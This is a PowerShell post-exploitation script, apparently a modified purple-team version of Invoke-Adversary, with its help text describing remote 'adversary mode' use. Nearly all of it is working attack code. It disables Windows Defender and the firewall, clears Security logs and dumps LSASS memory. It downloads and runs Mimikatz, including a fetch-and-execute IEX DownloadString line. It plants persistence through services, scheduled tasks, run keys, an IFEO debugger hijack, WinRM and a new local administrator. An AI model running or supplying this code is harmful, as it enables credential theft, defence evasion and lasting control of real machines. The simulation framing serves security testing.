

function get-Help 
{
    
    Write-Output "

    Brief:

        This is a modification to the original invoke-Adversary script by CyberMonitor 'https://github.com/CyberMonitor/Invoke-Adversary'.
        The original script was to simulate mostly used attack vectors in a controlled, agreed upon and local enviornment. Which means, it was Menu and prompt based, 
        interactive, and ran in a loop until stopped. Hence couldn't be used by adversary remotely and even if it was done, the shell would stop working until the
        script was quit.

        Issues: Written for and by out-dated powershell version and with scripts that are non existent being a 5 year old script.

        Modifications: 
            1. Updated all the cmdlets and repositories to for current version and existing repositories
            2. Stripped some of the similar functioning modules.
            3. Removed C2 connections and Execution methods as I don't think PSexec and fake C2 connections are much of use in remote and Adversary mode.
            4. Changed some of the downloaded locations to Desktop for better understanding for the purple teamer
            5. Removed Reflective Injection with PS techniques as recently none of them are working since (Nov 2022)
            6. Added WinRM as a way of achieving Persistence.

        Ideas: Please feel free to add modules as you wish or you can contact me with new ideas so I can try to integrate. Also this is my First PS script.
        So might be a little error prone.

    Discovery:
        User, Network and Services: do-Discover('full-Stats')

    Circumvent Secrity:
        Disable-AV: disable-Security('AV')
        Disable Firewall: disable-Security('Firewall')
        Add Firewall Rule to sample exe: disable-Security('addRule')
        Clear Security Logs: disable-Security('Slogs')
        
    Steal Credentials:
        Steal SAM with NinjaCopy: steal-Creds('procdumpLsass')
        Dump SAM with MimiKatz: steal-Creds('MimiDump')
        Mimikatz LogonPasswords: steal-Creds('LogonPass')

    persistence:
        Service based: do-Persist('Service')
        Scheduled task based: do-Persist('Scheduled')
        Registry Run on Startup: do-Persist('RunKey')
        Debugger Injection: do-Persist('Debugger')
        Via WinRM: do-Persist('winRM')
        Add local admin: do-Persist('newAdmin')
        
        
        "

}

function disable-Security 
{
    [CmdletBinding()]
    param ([string]$arg)
    if ($arg -eq "AV")
    {
        
        Write-Output "Disabling AV RealTime, AVProtection, Behavior Monitoring, IPS and Privacy Mode"

        Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
        Set-MpPreference -DisableIOAVProtection $true -Verbose
        Set-MpPreference -DisableBehaviorMonitoring $true -Verbose
        Set-MpPreference -DisableIntrusionPreventionSystem $true -Verbose
        Set-MpPreference -DisablePrivacyMode $true -Verbose

    }
    elseif ($arg -eq "firewall") 
    {
        Write-Output "Disabling Firewall"
        Start-Process -FilePath "netsh.exe" -ArgumentList "Advfirewall set allprofiles state off" -Verbose
    }
    elseif ($arg -eq "addRule") 
    {
        Write-Output "Adding firewall rule for test program c:\Windows\BadApp.exe"
        Start-Process -FilePath "netsh.exe" -ArgumentList "advfirewall firewall add rule name=`"Invoke-APT Test Rule`" dir=in program=`"c:\Windows\BadApp.exe`" action=allow" 
    }
    elseif ($arg -eq "Slogs") 
    {
        Write-Output "Clearing Security Logs"
        Start-Process -FilePath "wevtutil.exe" -ArgumentList "cl Security"
    }
}

function steal-Creds
{
    [CmdletBinding()]
    param ([string]$arg)

    if ($arg -eq "procdumpLsass") 
    {
        Write-Output "Trying to steal credentials by dumping LSASS memory with ProcDump"

        $current_loc = Get-Location
        $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
        $DumpFile = [System.IO.Path]::GetTempFileName().replace(".tmp", ".dmp")
        $url = "https://live.sysinternals.com/procdump.exe"
        
        Write-Output "Downloading procdump into [$FileName]"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $FileName)
        
        Unblock-File $FileName
        Start-Process -FilePath $FileName -ArgumentList "-accepteula -accepteula -64 -ma lsass.exe $DumpFile"
        Write-Output "Dump file stored in: [$DumpFile]"
    
        Write-Output "Deleting procdump [$FileName] after 10 seconds"
        Start-Sleep -Seconds 10
        Remove-Item $FileName -Force
    }

    elseif ($arg -eq "MimiDump")
    {
        Write-Output "Trying to steal credentials Via MimiKatz"
        Invoke-Expression (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    }
    
    elseif ($arg -eq "LogonPass")
    {
        Write-Output "Trying to steal credentials Via Mimikatz executable"
        Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $current_location = Get-Location
        $FileName = [string]$current_location + "\mimikatz.zip"
        Write-Output $FileName
        $Folder = [System.IO.Path]::GetDirectoryName($FileName)
        Write-Output $folder
        $url = "https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip"
        
        Write-Output "Downloading mimikatz into [$FileName]"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $FileName)
        
        Unblock-File $FileName
        [System.IO.Compression.ZipFile]::ExtractToDirectory($FileName, $Folder)
        Start-Sleep -Seconds 10
        if([Environment]::Is64BitOperatingSystem)  
        {
            $exe64 = [string]$folder + "\mimikatz-master\x64\mimikatz.exe"
            Write-Output "64 Bit Exe Folder: [$exe64]"
            Write-Output "Windows is 64Bit"
            Start-Process -FilePath $exe64 -ArgumentList """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""  -NoNewWindow -PassThru -Verbose
        }
        else 
        {
            $exe32 = [string]$folder + "\mimikatz-master\Win32\mimikatz.exe"
            Write-Output "32 Bit Exe Folder: [$exe32]"
            Write-Output "Windows is 32Bit"
            Start-Process -FilePath $exe32 -ArgumentList """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
        }

    }

}

function do-Discover 
{
    [CmdletBinding()]
    param ([string]$arg)

    if ($arg -eq "full-Stats") 
    {
        
        Write-Output "Network Domain Users: "
        Start-Process -FilePath "net.exe" -ArgumentList "user /domain" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        Write-Output "Network Local Users: "
        Start-Process -FilePath "net.exe" -ArgumentList "user" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        Write-Output "Network Domain Admins: "
        Start-Process -FilePath "net.exe" -ArgumentList "group ""domain admins"" /domain" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        Write-Output "Local Services Running: "
        Start-Process -FilePath "net.exe" -ArgumentList "start" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        Write-Output "WHOAMI: "
        Start-Process -FilePath "cmd.exe" -ArgumentList "/C whoami" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        Write-Output "Network connections at present: "
        Start-Process -FilePath "netstat.exe" -ArgumentList "-ano" -NoNewWindow -PassThru -Verbose
        Write-Output "--------------------------------------------------------------------------------------"
        
    }

}

function do-Persist 
{
    [CmdletBinding()]
    param ([string]$arg)

    if ($arg -eq "Service") 
    {
        Write-Output "Trying to achieve persistence by adding service"
        New-Service -Name "WindowsHealth" -BinaryPathName "c:\Windows\Notepad.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose
    }

    elseif ($arg -eq "Scheduled") 
    {
        Write-Output "Trying to achieve persistence by Scheduling tasks"
        Start-Process -FilePath "schtasks.exe" -ArgumentList '/create /tn OfficeUpdaterA /tr "c:\Windows\Notepad.exe" /sc onlogon /ru System'
    }

    elseif ($arg -eq "RunKey") 
    {
        Write-Output "Trying to achieve persistence by adding startup script"
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad persistence" -Value "C:\Windows\notepad.exe" -PropertyType "String"
    }
    
    elseif ($arg -eq "Debugger")
    {
        Write-Output "Trying to achieve persistence by injecting debugger"
        New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mshta.exe" -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe' -PropertyType String
    }

    elseif ($arg -eq "winRM") 
    {
        Write-Output "Trying to achieve persistence by enabling Windows Remote Management"
        Enable-PSRemoting -SkipNetworkProfileCheck;
        winrm quickconfig -quiet;
        Restart-Service -Name winRM;
    }

    elseif ($arg -eq "newAdmin") 
    {
        Write-Output "Trying to achieve persistence by adding new Local Administrator"
        $Username = "NewAdmin"
        $Password = "TestPassword@1"

        $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"

        if (($adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username}) -eq $null) {
            Write-Output "Creating new local Administrator $Username."
            Start-Process -FilePath "net.exe" -ArgumentList "USER $Username $Password /add /active:yes /y" -NoNewWindow -PassThru -Verbose
            Start-Process -FilePath "net.exe" -ArgumentList "LOCALGROUP Administrators $Username /add /y" -NoNewWindow -PassThru -Verbose
            Start-Process -FilePath "wmic.exe" -ArgumentList "USERACCOUNT WHERE Name='$Username' SET PasswordExpires=FALSE" -NoNewWindow -PassThru -Verbose
        }
        else 
        {
            Write-Output "$Username already exists."
        }
    }

}
